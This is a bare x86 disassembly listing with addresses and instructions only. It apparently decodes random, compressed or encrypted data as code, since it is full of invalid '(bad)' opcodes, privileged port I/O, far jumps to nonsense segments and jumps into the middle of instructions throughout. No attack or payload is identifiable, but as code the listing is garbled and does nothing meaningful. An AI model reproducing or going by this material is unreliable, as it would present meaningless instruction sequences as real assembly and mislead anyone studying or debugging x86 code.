  41305f:	and    eax,0x55e9726d
  413064:	push   ss
  413065:	fstp   TBYTE PTR [edi-0x53]
  413068:	push   cs
  413069:	xor    dh,bh
  41306b:	jp     0x413082
  41306d:	jl     0x413012
  41306f:	mov    ebp,0xba7a2023
  413074:	ret    
  413075:	mov    ebx,0x14b221b5
  41307a:	and    ebp,DWORD PTR [ebp-0x6c]
  41307d:	mov    ah,0x67
  41307f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413080:	scas   eax,DWORD PTR es:[edi]
  413081:	jb     0x4130c3
  413083:	leave  
  413084:	mov    edx,0xd4be7f4e
  413089:	inc    ebp
  41308a:	cmp    eax,0x7026d33e
  41308f:	mov    BYTE PTR [ecx],bh
  413091:	rcl    DWORD PTR [edx-0x49],0x3b
  413095:	shl    BYTE PTR [edi-0x58],0x37
  413099:	push   esp
  41309a:	lock int 0xc2
  41309d:	int    0x73
  41309f:	or     bl,BYTE PTR [ecx+0x10cdd194]
  4130a5:	js     0x41310e
  4130a7:	out    dx,eax
  4130a8:	jns    0x413115
  4130aa:	jo     0x413039
  4130ac:	mul    DWORD PTR [eax+0x15fa6ff1]
  4130b2:	mov    al,ds:0x5b4afa7b
  4130b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130b8:	inc    ecx
  4130b9:	out    0x2d,ax
  4130bc:	cmp    eax,0xfc457810
  4130c1:	mov    DWORD PTR [edi+0x4],esp
  4130c4:	pop    eax
  4130c5:	ss pop esi
  4130c7:	mov    ebp,0x263c41ac
  4130cc:	add    cl,BYTE PTR [edi+0x40]
  4130cf:	sbb    eax,0x4baddd0d
  4130d4:	clc    
  4130d5:	ss repz (bad) 
  4130d8:	rcl    BYTE PTR [esi+ebp*2],1
  4130db:	jle    0x41313a
  4130dd:	sbb    al,BYTE PTR [edx+0x54001dd2]
  4130e3:	add    esi,DWORD PTR [ecx-0x36794f1f]
  4130e9:	cdq    
  4130ea:	mov    ebx,esi
  4130ec:	add    BYTE PTR [ecx*8+0x28027056],dl
  4130f3:	iret   
  4130f4:	xor    ebx,DWORD PTR [edx-0x2]
  4130f7:	ret    0x7b1b
  4130fa:	repnz sub al,0xda
  4130fd:	dec    ebp
  4130fe:	adc    eax,0xecdb028d
  413103:	mov    ecx,0x2d3d0116
  413108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413109:	xchg   esi,eax
  41310a:	leave  
  41310b:	bound  ebx,QWORD PTR [edx-0x7b15b437]
  413111:	mov    edi,0x21a1cd5a
  413116:	(bad)  
  413117:	es pop esi
  413119:	xchg   edi,eax
  41311a:	jns    0x41311e
  41311c:	or     BYTE PTR [eax],cl
  41311e:	or     BYTE PTR [edi+0x11],bl
  413121:	mov    al,0x97
  413123:	test   BYTE PTR [edi+0x43ced796],dl
  413129:	xchg   ebp,eax
  41312a:	int    0xb9
  41312c:	jle    0x413109
  41312e:	and    al,BYTE PTR [esi+0x6408f5b0]
  413134:	pushf  
  413135:	arpl   WORD PTR [ebx-0x7d],bx
  413138:	xor    BYTE PTR [ebx],dl
  41313a:	pop    es
  41313b:	mov    edx,0x6f671fc9
  413140:	push   ss
  413141:	sub    BYTE PTR [ebx-0x1186e2a4],bh
  413147:	neg    dh
  413149:	test   BYTE PTR [ecx+0x39],al
  41314c:	adc    eax,DWORD PTR [ecx*8-0x7565e78]
  413153:	pop    ds
  413154:	inc    ecx
  413155:	push   0x59cf0307
  41315a:	mov    cl,0x44
  41315c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41315d:	adc    al,0xc2
  41315f:	fbld   TBYTE PTR [edx]
  413161:	inc    edi
  413162:	adc    al,0xc6
  413164:	data16 fwait
  413166:	mov    eax,ds:0x24c410cd
  41316b:	dec    eax
  41316c:	cmp    bh,BYTE PTR [ecx]
  41316e:	(bad)  
  41316f:	push   0x9f2f2df8
  413174:	aam    0x3c
  413176:	arpl   WORD PTR [edx+0x70],si
  413179:	mov    al,0x35
  41317b:	mov    eax,ds:0x86448558
  413180:	and    esp,DWORD PTR ds:0x8f562780
  413186:	fst    QWORD PTR [esi]
  413188:	sub    eax,0xb62d199a
  41318d:	and    ch,BYTE PTR [eax]
  41318f:	and    DWORD PTR [ebx],ebx
  413191:	add    dl,BYTE PTR [edx+0x14]
  413194:	int3   
  413195:	out    0xd3,eax
  413197:	adc    BYTE PTR [ebx+0x5a],cl
  41319a:	mov    dh,BYTE PTR [ebp-0x13]
  41319d:	pop    ebx
  41319e:	imul   edx,DWORD PTR [edx+ebp*1],0xd509ad29
  4131a5:	enter  0x11c,0x1e
  4131a9:	xor    al,dl
  4131ab:	mov    ch,0x7b
  4131ad:	icebp  
  4131ae:	ficomp DWORD PTR [edi+0x7d]
  4131b1:	jne    0x41322d
  4131b3:	inc    esp
  4131b4:	dec    esi
  4131b5:	xchg   DWORD PTR [eax+ebp*8+0x5f43cf51],ebp
  4131bc:	sub    eax,0x5d4f50ce
  4131c1:	pop    ds
  4131c2:	pushf  
  4131c3:	lds    esp,FWORD PTR [ecx+0x27]
  4131c6:	(bad)  
  4131c7:	sbb    eax,0x5e33a8b8
  4131cc:	sbb    al,0x31
  4131ce:	cmc    
  4131cf:	sbb    sp,WORD PTR [ebx]
  4131d2:	push   eax
  4131d3:	xchg   DWORD PTR [ebx-0x3],esi
  4131d6:	mov    ds:0x67756944,eax
  4131db:	stos   BYTE PTR es:[edi],al
  4131dc:	sub    eax,0x72ac38f9
  4131e1:	mov    edi,0xb253dfd0
  4131e6:	cwde   
  4131e7:	out    dx,eax
  4131e8:	or     al,0x44
  4131ea:	outs   dx,DWORD PTR ds:[esi]
  4131eb:	pop    ss
  4131ec:	jbe    0x41323a
  4131ee:	push   edi
  4131ef:	shl    DWORD PTR [ecx],cl
  4131f1:	imul   ecx
  4131f3:	and    DWORD PTR [edi],0xd9176c70
  4131f9:	gs add ah,0x76
  4131fd:	pop    ss
  4131fe:	add    bh,BYTE PTR [eax]
  413200:	aaa    
  413201:	call   0x9ce2073c
  413206:	pop    eax
  413207:	out    0x12,eax
  413209:	scas   eax,DWORD PTR es:[edi]
  41320a:	push   esp
  41320b:	mov    eax,cs
  41320d:	lahf   
  41320e:	sbb    al,0x5b
  413210:	dec    eax
  413211:	adc    ah,BYTE PTR [esi+0x52]
  413214:	pop    edx
  413215:	mov    dl,0x4d
  413217:	imul   ecx,DWORD PTR [ebx],0xe9af52e9
  41321d:	fisttp QWORD PTR [ebx-0x7411bd43]
  413223:	pop    ebx
  413224:	repnz icebp 
  413226:	pop    DWORD PTR [ebx]
  413228:	or     BYTE PTR ds:0xf964b6a4,al
  41322e:	cmp    dh,al
  413230:	ror    BYTE PTR [eax+edx*4-0x47],cl
  413234:	shrd   ebp,ebx,0xcb
  413238:	pop    esp
  413239:	cmp    DWORD PTR [edi+0x1493512a],ebx
  41323f:	pop    es
  413240:	mov    DWORD PTR [esi-0x6967267f],ebp
  413246:	xchg   edi,eax
  413247:	cs in  al,dx
  413249:	xor    DWORD PTR [esi-0x2603c4ba],0xfffffffd
  413250:	pop    esp
  413251:	cmp    ebx,esp
  413253:	push   edx
  413254:	lods   eax,DWORD PTR ds:[esi]
  413255:	and    BYTE PTR [ebx+0x2a],dl
  413258:	push   ecx
  413259:	pop    esp
  41325a:	ret    
  41325b:	add    ch,cl
  41325d:	fcmovnu st,st(2)
  41325f:	xor    edi,DWORD PTR ds:[ebx+0x32c9a6a9]
  413266:	jl     0x413258
  413268:	adc    al,0x34
  41326a:	loope  0x4132a2
  41326c:	imul   ebx,eax,0xffffffef
  41326f:	pop    edi
  413270:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413271:	mov    dl,0x66
  413273:	jo     0x413204
  413275:	pop    edi
  413276:	or     DWORD PTR ss:[edi],esp
  413279:	(bad)  
  41327a:	and    eax,0xb31f2314
  41327f:	cli    
  413280:	mov    dl,0x2d
  413282:	sbb    al,0xfd
  413284:	inc    ebx
  413285:	test   al,0x2c
  413287:	or     DWORD PTR [eax-0x1e2c025a],0x1b
  41328e:	stc    
  41328f:	test   eax,0xe684100f
  413294:	mov    esi,esp
  413296:	inc    ebx
  413297:	int3   
  413298:	jmp    0x41321d
  41329a:	pop    ebx
  41329b:	gs loopne 0x413306
  41329e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41329f:	std    
  4132a0:	xchg   ebp,eax
  4132a1:	or     eax,0x7c3321a8
  4132a6:	fisttp QWORD PTR [edi]
  4132a8:	pushf  
  4132a9:	dec    BYTE PTR [ebp+0x1e]
  4132ac:	inc    esp
  4132ad:	xchg   ebx,eax
  4132ae:	std    
  4132af:	cs xchg ebx,eax
  4132b1:	fwait
  4132b2:	mov    edx,DWORD PTR [esi]
  4132b4:	daa    
  4132b5:	cmp    DWORD PTR [esi-0x7bcf39b2],eax
  4132bb:	not    BYTE PTR [eax-0x7068b6c8]
  4132c1:	aas    
  4132c2:	rol    DWORD PTR [ebx+0x39],0xde
  4132c6:	es jbe 0x413348
  4132c9:	arpl   WORD PTR [ebp+0x79a3d0ff],sp
  4132cf:	fistp  WORD PTR [esi]
  4132d1:	retf   
  4132d2:	ret    0xe379
  4132d5:	call   0x7db4:0xcf13eaf9
  4132dc:	inc    edi
  4132dd:	daa    
  4132de:	mov    dx,0x6b
  4132e2:	push   DWORD PTR [ebp-0x25]
  4132e5:	inc    edx
  4132e6:	pop    esp
  4132e7:	add    dh,BYTE PTR [edi+0x70526a03]
  4132ed:	mov    edi,0x743e3aa4
  4132f2:	jp     0x413274
  4132f4:	(bad)  [esi+esi*8]
  4132f7:	pop    ebx
  4132f8:	retf   0x8376
  4132fb:	pop    ecx
  4132fc:	sbb    DWORD PTR [eax+0x1c],edx
  4132ff:	push   esi
  413300:	xor    edi,edx
  413302:	jmp    DWORD PTR [eax+0x7f]
  413305:	cld    
  413306:	test   al,0x1
  413308:	mov    bh,0xf7
  41330a:	push   es
  41330b:	ror    DWORD PTR [ebp+ecx*8-0x64a4a673],1
  413312:	dec    edx
  413313:	iret   
  413314:	addr16 retf 
  413316:	sub    al,0x9b
  413318:	lods   al,BYTE PTR ds:[esi]
  413319:	jmp    0x7afd17c8
  41331e:	sub    DWORD PTR [eax-0x4],0x8037288a
  413325:	jle    0x41333d
  413327:	pushf  
  413328:	sbb    bh,BYTE PTR [edx+0x17]
  41332b:	js     0x41332b
  41332d:	loope  0x4132c0
  41332f:	scas   al,BYTE PTR es:[edi]
  413330:	fmul   st(6),st
  413332:	and    ebp,0xffffffcb
  413335:	gs push edx
  413337:	sbb    eax,0x67225b3b
  41333c:	sahf   
  41333d:	icebp  
  41333e:	aas    
  41333f:	mov    ds:0xe8949ebd,eax
  413344:	repnz int3 
  413346:	out    dx,eax
  413347:	lds    edi,FWORD PTR [ebp+eiz*4+0x636c5031]
  41334e:	mov    ebx,0x2938e76e
  413353:	call   0x36b52a7
  413358:	ds mov eax,0x77203847
  41335e:	adc    BYTE PTR [edx+eax*1],cl
  413361:	out    0xde,eax
  413363:	pop    ecx
  413364:	sub    DWORD PTR [esi-0x56b8f9c2],eax
  41336a:	mov    edi,0xd1a2747e
  41336f:	mov    ebx,0x563da67c
  413374:	mov    ebx,0x9e45c23c
  413379:	mov    dl,0x16
  41337b:	cs ja  0x413301
  41337e:	mov    ds:0x1ffb3114,al
  413383:	inc    eax
  413384:	popa   
  413385:	jge    0x413331
  413387:	and    eax,0x865655a5
  41338c:	xchg   edx,eax
  41338d:	data16 or BYTE PTR [eax+eax*8-0x76],dl
  413392:	fistp  DWORD PTR [ecx-0x234245ae]
  413398:	cmp    al,BYTE PTR [edx-0x5c]
  41339b:	into   
  41339c:	jo     0x413331
  41339e:	xor    eax,0xde34ec25
  4133a3:	xchg   DWORD PTR [esi+0x10],ecx
  4133a6:	push   ds
  4133a7:	cli    
  4133a8:	shl    DWORD PTR [eax],cl
  4133aa:	out    dx,al
  4133ab:	push   ebx
  4133ac:	or     ebp,eax
  4133ae:	push   cs
  4133af:	test   al,0x92
  4133b1:	(bad)  
  4133b2:	jl     0x41333f
  4133b4:	cmp    al,0x4f
  4133b6:	jmp    0x413358
  4133b8:	fbld   TBYTE PTR [esi]
  4133ba:	cs xchg esp,eax
  4133bc:	xchg   edx,eax
  4133bd:	adc    dh,cl
  4133bf:	adc    esi,DWORD PTR [edi]
  4133c1:	in     eax,0x83
  4133c3:	loope  0x413347
  4133c5:	cmp    DWORD PTR [eax],eax
  4133c7:	pusha  
  4133c8:	pop    esi
  4133c9:	jp     0x4133dd
  4133cb:	imul   edi,DWORD PTR [ebx-0xca3e019],0xd6cfefbf
  4133d5:	imul   ebx,DWORD PTR [edx],0xffffffda
  4133d8:	mov    al,0x33
  4133da:	pop    ds
  4133db:	outs   dx,DWORD PTR ds:[esi]
  4133dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133dd:	push   esi
  4133de:	pop    edx
  4133df:	mov    edx,0x2b786dbb
  4133e4:	in     eax,0xb0
  4133e6:	jecxz  0x41343b
  4133e8:	jmp    FWORD PTR [ecx]
  4133ea:	sub    DWORD PTR [ecx+0x26],0x2c
  4133ee:	clc    
  4133ef:	xchg   esp,eax
  4133f0:	dec    ebp
  4133f1:	ficomp DWORD PTR [ecx]
  4133f3:	jno    0x413388
  4133f5:	xchg   ebp,eax
  4133f6:	add    dh,BYTE PTR [esi]
  4133f8:	inc    ecx
  4133f9:	mov    edi,0x7e0727b1
  4133fe:	or     eax,0x28d53bab
  413403:	ror    DWORD PTR [ecx+ebp*8-0x52],0x4f
  413408:	cmp    ebx,DWORD PTR [edx]
  41340a:	sahf   
  41340b:	push   eax
  41340c:	xchg   edx,eax
  41340d:	and    DWORD PTR [edi+0x2b],edx
  413410:	aaa    
  413411:	jge    0x413468
  413413:	or     ax,0x1d74
  413417:	call   0xbfb0:0x59fce029
  41341e:	mov    dl,0x7e
  413420:	fisub  WORD PTR [ebx-0x3e]
  413423:	je     0x4133a9
  413425:	sbb    al,0x55
  413427:	add    eax,0x659b98fe
  41342c:	mov    al,ds:0x8a9bc5b5
  413431:	jmp    0x8785:0x9f951c7a
  413438:	fimul  WORD PTR [edx]
  41343a:	jmp    0x4133fe
  41343c:	mov    dh,0xc2
  41343e:	cdq    
  41343f:	(bad)  
  413440:	pop    ecx
  413441:	sbb    ah,BYTE PTR [ebx+edi*2]
  413444:	jb     0x4134ae
  413446:	inc    ecx
  413447:	pop    es
  413448:	add    BYTE PTR [ecx+0x59],bh
  41344b:	ins    DWORD PTR es:[edi],dx
  41344c:	mov    ds:0xd94b9fa9,eax
  413451:	sbb    esp,DWORD PTR [edi]
  413453:	sbb    DWORD PTR [eax+0x1b],ecx
  413456:	fistp  DWORD PTR [eax+edx*8+0x7f]
  41345a:	dec    edx
  41345b:	push   cs
  41345c:	xchg   esi,eax
  41345d:	or     DWORD PTR [eax-0x58],0xa6642b29
  413464:	sti    
  413465:	xchg   DWORD PTR [ebp+0x5f20b620],ebx
  41346b:	jb     0x413458
  41346d:	pop    edi
  41346e:	dec    ebx
  41346f:	les    ecx,FWORD PTR [ebx-0x1c]
  413472:	cld    
  413473:	cli    
  413474:	push   ss
  413475:	les    esi,FWORD PTR [esi-0x11177955]
  41347b:	mov    al,cl
  41347d:	xor    eax,0xadf03b52
  413482:	pop    ecx
  413483:	or     al,0x29
  413485:	into   
  413486:	fdiv   QWORD PTR [esi+0x79e666a8]
  41348c:	inc    ebx
  41348d:	cmp    ah,BYTE PTR [ebx+0x45b88e9e]
  413493:	(bad)  
  413494:	in     al,dx
  413495:	and    edi,DWORD PTR [eax+0x14]
  413498:	fwait
  413499:	lods   eax,DWORD PTR ds:[esi]
  41349a:	add    al,0x86
  41349c:	rcr    DWORD PTR [esi],0x7a
  41349f:	(bad)  [esi]
  4134a1:	inc    esp
  4134a2:	or     ecx,ecx
  4134a4:	xchg   BYTE PTR ds:0xab53aadc,dh
  4134aa:	lods   al,BYTE PTR ds:[esi]
  4134ab:	push   edi
  4134ac:	aam    0x92
  4134ae:	(bad)  
  4134af:	adc    DWORD PTR [ecx],eax
  4134b1:	xchg   esi,eax
  4134b2:	push   ecx
  4134b3:	pop    ds
  4134b4:	test   DWORD PTR [ebp+0x1c3825fd],esp
  4134ba:	mov    ch,0x42
  4134bc:	pop    ss
  4134bd:	lahf   
  4134be:	mov    WORD PTR [ebx+0x27],?
  4134c1:	and    bl,BYTE PTR [eax-0x57]
  4134c4:	add    eax,0x4ec71d82
  4134c9:	or     eax,DWORD PTR [edi-0x5d]
  4134cc:	outs   dx,DWORD PTR ds:[esi]
  4134cd:	shr    BYTE PTR [ebx],cl
  4134cf:	mov    eax,ds:0x4e05705d
  4134d4:	inc    edx
  4134d5:	push   cs
  4134d6:	retf   0x3b26
  4134d9:	mov    ah,0x8e
  4134db:	mov    cl,0x54
  4134dd:	pop    ebp
  4134de:	ss out 0x6a,eax
  4134e1:	add    dl,BYTE PTR [ebp-0x23]
  4134e4:	(bad)  
  4134e5:	dec    ebp
  4134e6:	out    dx,al
  4134e7:	adc    DWORD PTR [ebx+0x63ee071e],ecx
  4134ed:	xor    ecx,DWORD PTR ds:0xac38e78f
  4134f3:	xor    al,0x36
  4134f5:	stos   BYTE PTR es:[edi],al
  4134f6:	inc    esi
  4134f7:	xlat   BYTE PTR ds:[ebx]
  4134f8:	sbb    edi,DWORD PTR [ebp-0x80]
  4134fb:	xor    al,0x2d
  4134fd:	sbb    eax,0x17a61c7
  413502:	pushf  
  413503:	pop    ss
  413504:	mov    ds:0x99b2ca0f,eax
  413509:	bound  ebp,QWORD PTR ds:0x251f4c34
  41350f:	mov    ecx,0x7ff285c7
  413514:	add    eax,0xb0e6591a
  413519:	les    ebp,FWORD PTR [ebp+edx*2+0x6d]
  41351d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41351e:	pop    ebp
  41351f:	out    dx,eax
  413520:	adc    DWORD PTR [ebx],edi
  413522:	push   esi
  413523:	inc    edi
  413524:	mov    ah,0xe1
  413526:	pop    ss
  413527:	dec    esp
  413528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413529:	mov    ah,0x20
  41352b:	fbld   TBYTE PTR [edx]
  41352d:	aas    
  41352e:	or     eax,0x684caea6
  413533:	and    BYTE PTR [edx+esi*1],bh
  413536:	inc    esp
  413537:	xchg   ebx,eax
  413538:	mov    BYTE PTR [esi+0x16],ch
  41353b:	cmp    eax,0xa7829b1c
  413540:	mov    ch,0x3a
  413542:	sahf   
  413543:	fucomi st,st(3)
  413545:	pop    edi
  413546:	les    edx,FWORD PTR [edx-0x38]
  413549:	and    eax,0xf87093d9
  41354e:	inc    esi
  41354f:	call   0x4e8b353
  413554:	push   ds
  413555:	dec    esi
  413556:	mov    cl,0xea
  413558:	dec    ch
  41355a:	inc    esp
  41355b:	mov    al,ds:0xd3ace535
  413560:	pusha  
  413561:	inc    ebp
  413562:	retf   0x3942
  413565:	jae    0x413511
  413567:	mov    cl,0x7a
  413569:	dec    ebp
  41356a:	call   0xcff17e15
  41356f:	lea    esi,[ebp+eax*8+0x5d]
  413573:	add    al,BYTE PTR [eax]
  413575:	pop    eax
  413576:	test   eax,0xceed8da3
  41357b:	sbb    al,0x39
  41357d:	sbb    cl,bl
  41357f:	xor    edi,DWORD PTR [edi+0x47]
  413582:	xchg   ebp,eax
  413583:	push   0x56b920d8
  413588:	xor    BYTE PTR [edi+0x78d063ce],ah
  41358e:	fldpi  
  413590:	mov    cl,0xcf
  413592:	stos   DWORD PTR es:[edi],eax
  413593:	dec    esi
  413594:	add    BYTE PTR [ebp+0x7c8a765a],ch
  41359a:	fisubr DWORD PTR [ecx+0x7c]
  41359d:	add    al,0x8b
  41359f:	cmp    BYTE PTR [edx],ah
  4135a1:	mov    eax,0xa0aa5f1c
  4135a6:	adc    ecx,DWORD PTR [ecx+0x65]
  4135a9:	xor    edx,eax
  4135ab:	and    cl,bh
  4135ad:	test   eax,0xaac40e9a
  4135b2:	push   esi
  4135b3:	and    BYTE PTR [esi],bl
  4135b5:	sub    al,0xdc
  4135b7:	lods   al,BYTE PTR ds:[esi]
  4135b8:	das    
  4135b9:	mov    esp,0x4c665332
  4135be:	(bad)  
  4135bf:	xor    bh,dh
  4135c1:	imul   edi,DWORD PTR [ecx+0x356a60dd],0x67
  4135c8:	sti    
  4135c9:	dec    edx
  4135ca:	sbb    DWORD PTR [eax],0x56
  4135cd:	pop    ebp
  4135ce:	cwde   
  4135cf:	xor    ah,cl
  4135d1:	out    dx,al
  4135d2:	adc    al,0x4b
  4135d4:	iret   
  4135d5:	dec    eax
  4135d6:	cmp    eax,DWORD PTR [edi-0x78]
  4135d9:	in     eax,dx
  4135da:	or     DWORD PTR [edi-0x3e],ebx
  4135dd:	xor    edi,ebx
  4135df:	in     eax,dx
  4135e0:	sub    BYTE PTR [esi],0x72
  4135e3:	mov    ebx,DWORD PTR [esi+ebx*2-0x604f170]
  4135ea:	out    dx,eax
  4135eb:	pop    ebx
  4135ec:	sar    BYTE PTR [ebp-0x6149cbc8],1
  4135f2:	add    DWORD PTR [ebx-0x3ea9847f],eax
  4135f8:	push   es
  4135f9:	call   0xaed3b9b9
  4135fe:	inc    BYTE PTR [edx]
  413600:	fisub  WORD PTR [esi-0x36]
  413603:	inc    edi
  413604:	jge    0x41367e
  413606:	daa    
  413607:	js     0x4135f4
  413609:	ins    BYTE PTR es:[edi],dx
  41360a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41360b:	das    
  41360c:	lea    ebx,[edx-0x66]
  41360f:	dec    esp
  413610:	mov    ebp,0x115c21af
  413615:	xchg   edx,eax
  413616:	dec    edx
  413617:	fisubr WORD PTR [eax-0x3e532af5]
  41361d:	and    BYTE PTR [esi+0x31e120fc],0x8a
  413624:	pop    edx
  413625:	daa    
  413626:	in     al,0x98
  413628:	jle    0x41362c
  41362a:	mov    ebp,DWORD PTR [edx+0x61]
  41362d:	xchg   DWORD PTR [ecx],edx
  41362f:	jns    0x4135b8
  413631:	mov    ebx,0xed6c41d3
  413636:	jne    0x413668
  413638:	mov    cl,0xd5
  41363a:	test   esi,edx
  41363c:	mov    edi,ebp
  41363e:	cdq    
  41363f:	adc    esi,ebx
  413641:	or     ah,BYTE PTR [ebp+0x7c8d66de]
  413647:	xlat   BYTE PTR ds:[ebx]
  413648:	loopne 0x4136a7
  41364a:	icebp  
  41364b:	sbb    DWORD PTR [ecx-0x54],ebx
  41364e:	div    ebp
  413650:	push   cs
  413651:	je     0x413660
  413653:	sbb    DWORD PTR [ecx+0xab0b766],edx
  413659:	stc    
  41365a:	pop    ecx
  41365b:	and    al,0x5c
  41365d:	aaa    
  41365e:	je     0x41367a
  413660:	jle    0x4136c7
  413662:	dec    ebx
  413663:	fcomp  DWORD PTR [edx+0x6c]
  413666:	push   ds
  413667:	lods   al,BYTE PTR ds:[esi]
  413668:	mov    dh,BYTE PTR [edi-0x38f5666a]
  41366e:	scas   al,BYTE PTR es:[edi]
  41366f:	iret   
  413670:	dec    eax
  413671:	into   
  413672:	push   ecx
  413673:	lahf   
  413674:	pop    es
  413675:	jno    0x413672
  413677:	popf   
  413678:	inc    eax
  413679:	setg   BYTE PTR [ecx-0x2df4d876]
  413680:	add    al,0xfe
  413682:	dec    edx
  413683:	adc    ebx,DWORD PTR [ecx]
  413685:	icebp  
  413686:	sbb    edi,DWORD PTR [edx+0x70]
  413689:	push   ds
  41368a:	jl     0x41363c
  41368c:	inc    ebx
  41368d:	inc    ebx
  41368e:	in     eax,0xaf
  413690:	(bad)  
  413691:	cld    
  413692:	dec    edx
  413693:	push   edi
  413694:	xor    esi,DWORD PTR [ebx+0x520417d6]
  41369a:	dec    ebp
  41369b:	add    ebx,esi
  41369d:	sub    eax,0x76f8502e
  4136a2:	enter  0xc21,0x32
  4136a6:	mov    al,ds:0x217ff7ca
  4136ab:	lods   eax,DWORD PTR ds:[esi]
  4136ac:	jnp    0x413686
  4136ae:	pusha  
  4136af:	pop    edx
  4136b0:	cmp    esi,DWORD PTR [ebx]
  4136b2:	dec    ebp
  4136b3:	scas   eax,DWORD PTR es:[edi]
  4136b4:	cmp    eax,ecx
  4136b6:	lea    edi,[ebp+0x3c1cc22]
  4136bc:	inc    edx
  4136bd:	dec    edx
  4136be:	pop    esp
  4136bf:	push   ds
  4136c0:	jmp    0x42bd:0x9f3790a
  4136c7:	push   esp
  4136c8:	push   es
  4136c9:	jle    0x413667
  4136cb:	xor    eax,0xb1664ff7
  4136d0:	jg     0x4136fd
  4136d2:	xchg   edi,eax
  4136d3:	loope  0x4136aa
  4136d5:	mov    bl,0x86
  4136d7:	and    edi,DWORD PTR [edi+0x47]
  4136da:	xchg   ebp,eax
  4136db:	icebp  
  4136dc:	add    DWORD PTR [ebp-0x58be8f0f],ebp
  4136e2:	xor    DWORD PTR [edi],ebp
  4136e4:	in     eax,dx
  4136e5:	dec    esi
  4136e6:	push   ebx
  4136e7:	sbb    ebp,DWORD PTR [eax]
  4136e9:	scas   al,BYTE PTR es:[edi]
  4136ea:	xchg   edx,esi
  4136ec:	mov    al,ds:0x26777ebc
  4136f1:	gs add edx,DWORD PTR fs:[ecx]
  4136f5:	lea    eax,[edx-0x56edca4]
  4136fb:	pop    ebx
  4136fc:	add    BYTE PTR [ebx],dl
  4136fe:	call   0xe2fd:0x4a455d9a
  413705:	and    eax,0x386845e5
  41370a:	out    dx,al
  41370b:	inc    edx
  41370c:	and    eax,ecx
  41370e:	mov    ss,WORD PTR cs:[eax-0x3]
  413712:	test   bh,al
  413714:	jne    0x413768
  413716:	pop    ecx
  413717:	fadd   DWORD PTR [esi+0x52]
  41371a:	lods   al,BYTE PTR ds:[esi]
  41371b:	fsubr  DWORD PTR [esi*1-0x57617f1f]
  413722:	dec    ebx
  413723:	push   ds
  413724:	sbb    ch,BYTE PTR [edx+0x78]
  413727:	out    dx,eax
  413728:	inc    edi
  413729:	jecxz  0x4136ce
  41372b:	rcl    dl,0x92
  41372e:	retf   0xbd36
  413731:	mov    esp,0x53d55e0f
  413736:	xchg   edx,eax
  413737:	mov    ebx,DWORD PTR [eax]
  413739:	or     al,0xe5
  41373b:	mov    cl,0xe3
  41373d:	sub    al,0x2
  41373f:	pop    DWORD PTR [ebx-0x1c]
  413742:	repnz loope 0x41374b
  413745:	inc    eax
  413746:	inc    edx
  413747:	aad    0x14
  413749:	jo     0x413729
  41374b:	jne    0x4137c1
  41374d:	add    dh,dl
  41374f:	jb     0x413723
  413751:	push   edx
  413752:	or     eax,0xe2a7368d
  413757:	sbb    dl,bh
  413759:	ret    0xeb56
  41375c:	loop   0x413753
  41375e:	pop    es
  41375f:	(bad)  
  413760:	stc    
  413761:	mov    DWORD PTR [esi+0x17af537c],ebx
  413767:	jb     0x4137a1
  413769:	and    ah,ah
  41376b:	push   0x355cce4b
  413770:	into   
  413771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413772:	inc    ecx
  413773:	pop    edi
  413774:	mov    ds:0x557fb35c,al
  413779:	fistp  QWORD PTR [ebp-0x6]
  41377c:	and    DWORD PTR [ebx],ecx
  41377e:	jle    0x41373a
  413780:	inc    esp
  413781:	jge    0x4137d5
  413783:	xor    eax,0x37ef714c
  413788:	cmp    BYTE PTR ds:0xec345f21,dh
  41378e:	es enter 0xf729,0xc
  413793:	cmc    
  413794:	out    0xd8,eax
  413796:	and    dl,dh
  413798:	stos   BYTE PTR es:[edi],al
  413799:	or     al,BYTE PTR [ebx]
  41379b:	(bad)  
  41379c:	xlat   BYTE PTR ds:[ebx]
  41379d:	push   ecx
  41379e:	ds aad 0x8
  4137a1:	daa    
  4137a2:	lods   eax,DWORD PTR ds:[esi]
  4137a3:	mov    dl,0x59
  4137a5:	mov    ecx,0x517461c7
  4137aa:	jns    0x413825
  4137ac:	dec    edx
  4137ad:	mov    bl,0xf2
  4137af:	sub    al,0xc5
  4137b1:	mov    esi,0x25d2ae20
  4137b6:	sub    eax,0x4893cb39
  4137bb:	jb     0x41373f
  4137bd:	loope  0x41376d
  4137bf:	and    al,0x6f
  4137c1:	popf   
  4137c2:	pop    es
  4137c3:	xor    al,0x7c
  4137c5:	dec    esi
  4137c6:	dec    edx
  4137c7:	pop    edx
  4137c8:	sar    DWORD PTR [edx+ebx*8],cl
  4137cb:	mov    cl,0x41
  4137cd:	xchg   DWORD PTR [edi+0x21],edi
  4137d0:	inc    edi
  4137d1:	dec    eax
  4137d2:	call   0x8bc05920
  4137d7:	les    ebp,FWORD PTR [esi]
  4137d9:	in     eax,dx
  4137da:	adc    DWORD PTR ds:0x1c7f04a1,esp
  4137e0:	fst    DWORD PTR [ebp+esi*1+0x3c1b9613]
  4137e7:	(bad)  
  4137e8:	(bad)  
  4137e9:	aad    0xae
  4137eb:	inc    ecx
  4137ec:	or     BYTE PTR [ebp-0x78],bh
  4137ef:	outs   dx,DWORD PTR ds:[esi]
  4137f0:	xchg   edi,eax
  4137f1:	arpl   WORD PTR [ebx],di
  4137f3:	repz das 
  4137f5:	bound  ecx,QWORD PTR [ebp+ebx*1-0x6e]
  4137f9:	cmp    eax,0x8b25e219
  4137fe:	test   BYTE PTR [ebx],0xf0
  413801:	in     al,dx
  413802:	mov    ch,0xc6
  413804:	inc    esp
  413805:	push   edi
  413806:	push   es
  413807:	repnz ffree st(3)
  41380a:	xchg   edx,eax
  41380b:	xchg   ecx,eax
  41380c:	js     0x4137bf
  41380e:	retf   0x3bdd
  413811:	pop    eax
  413812:	mov    DWORD PTR [eax-0x56],eax
  413815:	imul   edi,esp,0x29
  413818:	adc    bh,bl
  41381a:	aaa    
  41381b:	mov    dl,0x28
  41381d:	and    eax,0x3f7725c2
  413822:	inc    ebx
